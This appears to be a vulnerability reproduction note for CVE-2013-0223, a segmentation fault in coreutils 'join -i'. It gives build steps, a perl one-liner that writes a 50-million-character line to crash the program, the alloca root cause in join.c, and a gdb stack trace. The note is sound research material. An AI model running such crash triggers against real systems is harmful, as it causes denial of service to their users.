# CVE-2013-0223

## Experiment Environment

CentOS 6.4

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/CVE-2013-0223/coreutils-8.4-patched.tar.gz

tar -xvf coreutils-8.4-patched.tar.gz
cd coreutils-8.4
./configure
make
```

## Problems in Installation & Configuration

See [CVE-2013-0222](../CVE-2013-0222)

## How to trigger vulnerability

```
perl -e 'print "1","A"x50000000,"\r\n\r\n"' > /tmp/test.txt
join -i /tmp/test.txt /tmp/test.txt
```

## PoCs

[(CVE-2013-0223) VUL-1: CVE-2013-0223: coreutils: segmentation fault in "join -i" with long line input](https://bugzilla.novell.com/show_bug.cgi?id=798541)

## Vulnerability Details & Patch

### Root Cause

```
join.c:495

	copy[i] = alloca (len[i] + 1);
```

### Stack Trace

```
(gdb) info stack
#0  0x0804a039 in keycmp (line1=<value optimized out>, line2=<value optimized out>, jf_1=0, jf_2=0) at join.c:500
#1  0x0804b3d4 in system_join (argc=4, argv=0xbf9a2214) at join.c:852
#2  main (argc=4, argv=0xbf9a2214) at join.c:1354
```

## References
